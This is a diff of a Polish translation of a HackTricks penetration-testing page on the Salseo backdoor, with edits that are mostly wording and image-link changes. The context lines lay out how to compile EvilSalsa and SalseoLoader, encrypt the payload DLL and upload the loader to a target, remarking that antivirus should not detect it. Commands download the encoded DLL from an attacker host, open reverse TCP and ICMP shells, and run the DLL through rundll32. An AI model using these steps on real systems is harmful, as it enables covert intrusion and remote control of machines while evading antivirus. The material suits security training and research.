@@ -16,19 +16,19 @@ Inne sposoby wsparcia HackTricks:
 
 ## Kompilacja binarnych plików
 
-Pobierz kod źródłowy z githuba i skompiluj **EvilSalsa** i **SalseoLoader**. Będziesz potrzebować zainstalowanego **Visual Studio**, aby skompilować kod.
+Pobierz kod źródłowy z githuba i skompiluj **EvilSalsa** oraz **SalseoLoader**. Będziesz potrzebować zainstalowanego **Visual Studio**, aby skompilować kod.
 
 Skompiluj te projekty dla architektury systemu Windows, na którym będziesz ich używać (jeśli Windows obsługuje x64, skompiluj je dla tej architektury).
 
-Możesz **wybrać architekturę** wewnątrz Visual Studio w zakładce **"Build"** po lewej stronie w **"Platform Target".**
+Możesz **wybrać architekturę** wewnątrz Visual Studio w zakładce **"Build"** w **"Platform Target".**
 
 (\*\*Jeśli nie możesz znaleźć tych opcji, kliknij w **"Project Tab"**, a następnie w **"\<Project Name> Properties"**)
 
-![](<../.gitbook/assets/image (836).png>)
+![](<../.gitbook/assets/image (839).png>)
 
-Następnie skompiluj oba projekty (Build -> Build Solution) (W logach pojawi się ścieżka do pliku wykonywalnego):
+Następnie zbuduj oba projekty (Build -> Build Solution) (W logach pojawi się ścieżka do pliku wykonywalnego):
 
-![](<../.gitbook/assets/image (378).png>)
+![](<../.gitbook/assets/image (381).png>)
 
 ## Przygotowanie tylnych drzwi
 
@@ -46,13 +46,13 @@ EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
 Ok, teraz masz wszystko, czego potrzebujesz do wykonania całej rzeczy Salseo: **zakodowany EvilDalsa.dll** i **binarny plik SalseoLoader.**
 
-**Prześlij binarny plik SalseoLoader.exe na maszynę. Nie powinny być one wykrywane przez żadne oprogramowanie antywirusowe...**
+**Prześlij binarny plik SalseoLoader.exe na maszynę. Nie powinny być one wykrywane przez żadne AV...**
 
 ## **Wykonaj backdoor**
 
-### **Uzyskiwanie powrotnej powłoki TCP (pobieranie zakodowanego dll przez HTTP)**
+### **Uzyskiwanie odwrotnego powłoki TCP (pobieranie zakodowanego dll przez HTTP)**
 
-Pamiętaj, aby uruchomić nc jako nasłuchiwacz powłoki odwróconej oraz serwer HTTP do obsługi zakodowanego evilsalsa.
+Pamiętaj, aby uruchomić nc jako nasłuchiwacz odwrotnej powłoki oraz serwer HTTP do obsługi zakodowanego evilsalsa.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -73,7 +73,7 @@ sysctl -w net.ipv4.icmp_echo_ignore_all=1
 #You finish, you can enable it again running:
 sysctl -w net.ipv4.icmp_echo_ignore_all=0
 ```
-#### Uruchom klienta:
+#### Wykonaj klienta:
 ```
 python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
 ```
@@ -87,25 +87,25 @@ Otwórz projekt SalseoLoader za pomocą programu Visual Studio.
 
 ### Dodaj przed funkcją główną: \[DllExport]
 
-![](<../.gitbook/assets/image (405).png>)
+![](<../.gitbook/assets/image (409).png>)
 
 ### Zainstaluj DllExport dla tego projektu
 
 #### **Narzędzia** --> **Menedżer pakietów NuGet** --> **Zarządzaj pakietami NuGet dla rozwiązania...**
 
-![](<../.gitbook/assets/image (878).png>)
+![](<../.gitbook/assets/image (881).png>)
 
-#### **Wyszukaj pakiet DllExport (używając karty Przeglądaj) i naciśnij Zainstaluj (i zaakceptuj okno popup)**
+#### **Wyszukaj pakiet DllExport (używając karty Przeglądaj) i naciśnij Zainstaluj (i zaakceptuj wyskakujące okno)**
 
-![](<../.gitbook/assets/image (97).png>)
+![](<../.gitbook/assets/image (100).png>)
 
 W folderze projektu pojawiły się pliki: **DllExport.bat** i **DllExport\_Configure.bat**
 
-### **Odinstaluj DllExport**
+### **O**dinstaluj DllExport
 
 Naciśnij **Odinstaluj** (tak, to dziwne, ale uwierz mi, jest to konieczne)
 
-![](<../.gitbook/assets/image (94).png>)
+![](<../.gitbook/assets/image (97).png>)
 
 ### **Zamknij Visual Studio i wykonaj DllExport\_configure**
 
@@ -115,25 +115,25 @@ Następnie przejdź do folderu **SalseoLoader** i **wykonaj plik DllExport\_Conf
 
 Wybierz **x64** (jeśli zamierzasz użyć go wewnątrz x64, tak było w moim przypadku), wybierz **System.Runtime.InteropServices** (wewnątrz **Przestrzeń nazw dla DllExport**) i naciśnij **Zastosuj**
 
-![](<../.gitbook/assets/image (879).png>)
+![](<../.gitbook/assets/image (882).png>)
 
 ### **Otwórz projekt ponownie w Visual Studio**
 
 **\[DllExport]** nie powinien być już oznaczony jako błąd
 
-![](<../.gitbook/assets/image (667).png>)
+![](<../.gitbook/assets/image (670).png>)
 
 ### Zbuduj rozwiązanie
 
 Wybierz **Typ wyjściowy = Biblioteka klas** (Projekt --> Właściwości SalseoLoader --> Aplikacja --> Typ wyjścia = Biblioteka klas)
 
-![](<../.gitbook/assets/image (844).png>)
+![](<../.gitbook/assets/image (847).png>)
 
-Wybierz **platformę x64** (Projekt --> Właściwości SalseoLoader --> Kompilacja --> Platforma docelowa = x64)
+Wybierz **platformę x64** (Projekt --> Właściwości SalseoLoader --> Buduj --> Platforma docelowa = x64)
 
-![](<../.gitbook/assets/image (282).png>)
+![](<../.gitbook/assets/image (285).png>)
 
-Aby **zbudować** rozwiązanie: Build --> Zbuduj rozwiązanie (W konsoli wyjściowej pojawi się ścieżka nowego pliku DLL)
+Aby **zbudować** rozwiązanie: Buduj --> Zbuduj rozwiązanie (W konsoli wyjściowej pojawi się ścieżka nowego pliku DLL)
 
 ### Przetestuj wygenerowane Dll
 
@@ -143,9 +143,9 @@ Wykonaj:
 ```
 rundll32.exe SalseoLoader.dll,main
 ```
-Jeśli nie pojawi się żadny błąd, prawdopodobnie masz działającą DLL!!
+Jeśli nie pojawi się żaden błąd, prawdopodobnie masz działające DLL!
 
-## Uzyskaj powłokę za pomocą DLL
+## Uzyskaj powłokę, korzystając z DLL
 
 Nie zapomnij użyć **serwera HTTP** i ustawić **nasłuchiwacza nc**
 
@@ -160,7 +160,7 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-### CMD
+### Wiersz poleceń
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
@@ -175,10 +175,10 @@ rundll32.exe SalseoLoader.dll,main
 
 Inne sposoby wsparcia HackTricks:
 
-* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
+* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF** sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
 * Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
 * Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
 * **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.
 
 </details>
